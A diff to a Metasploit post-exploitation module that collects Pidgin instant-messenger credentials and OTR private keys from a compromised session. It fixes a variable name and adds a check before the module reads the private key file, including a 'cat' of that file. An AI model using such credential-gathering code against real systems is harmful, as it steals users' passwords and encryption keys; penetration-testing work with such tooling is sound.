@@ -21,7 +21,9 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super( update_info(info,
 			'Name'           => 'Multi Gather Pidgin Instant Messenger Credential Collection',
-			'Description'    => %q{ This module will collect credentials from the Pidgin IM client if it is installed. },
+			'Description'    => %q{ 
+				This module will collect credentials from the Pidgin IM client if it is installed.
+				},
 			'License'        => MSF_LICENSE,
 			'Author'         => 
 				[
@@ -151,7 +153,7 @@ class Metasploit3 < Msf::Post
 	end
 
 	def get_pidgin_creds(paths)
-		case path
+		case paths
 			when /#{@user}\\(.*)\\/
 				sys_user = $1
 			when /home\/(.*)\//
@@ -229,9 +231,15 @@ class Metasploit3 < Msf::Post
 			if session.type == "shell"
 				otr_key = session.shell_command("cat #{path}/otr.private_key")
 			else
-				f = session.fs.file.new("#{path}/otr.private_key", "rb")
-				until f.eof?
-					otr_key << f.read
+				key_file = "#{path}/otr.private_key"
+				otrkey = session.fs.file.stat(key_file) rescue nil
+				if otrkey
+					f = session.fs.file.new(key_file, "rb")
+					until f.eof?
+						otr_key << f.read
+					end
+				else
+					otr_key = "No such file"
 				end
 			end
 
